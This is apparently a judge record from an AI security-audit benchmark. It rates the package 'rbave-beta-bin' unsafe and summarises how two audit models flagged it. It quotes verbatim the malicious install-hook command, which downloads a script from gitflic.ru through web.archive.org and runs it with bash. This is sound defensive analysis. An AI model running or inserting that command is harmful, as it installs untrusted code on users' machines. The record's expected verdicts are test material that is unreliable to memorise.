@@ -1,0 +1,28 @@
+{
+  "package": "rbave-beta-bin",
+  "correct_verdict": "unsafe",
+  "confidence": "high",
+  "reasoning": "Both models correctly identified a critical supply-chain attack in rbave-beta-bin.install: line 9 executes `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. This downloads and runs arbitrary code from an unrelated third-party host (gitflic.ru) during package installation, with no integrity verification. The use of web.archive.org as an intermediary appears to be obfuscation. This serves no legitimate purpose for a Brave browser package and constitutes a direct injection attack that executes with the installer's privileges.",
+  "disagreement_analysis": null,
+  "coverage_issues": [],
+  "false_positives": [],
+  "false_negatives": [],
+  "re_audit_recommended": false,
+  "re_audit_focus": [],
+  "learnings": [
+    "Models correctly identified curl|bash pattern in install hooks as a critical supply-chain attack vector",
+    "Models appropriately recognized web.archive.org as an obfuscation technique rather than a legitimate CDN",
+    "Install scripts (.install files) are properly prioritized in the audit scope as they execute during package installation",
+    "Both models correctly distinguished between upstream application behavior and injected packaging code"
+  ],
+  "_judge_usage": {
+    "model": "qwen/qwen3.7-plus",
+    "prompt_tokens": 8616,
+    "completion_tokens": 989,
+    "cost": 0.00402304
+  },
+  "audits_judged": [
+    "20261014-030650-qwen-qwen3-235b-a22b-2507.md",
+    "20261014-030608-deepseek-deepseek-v4-flash.md"
+  ]
+}
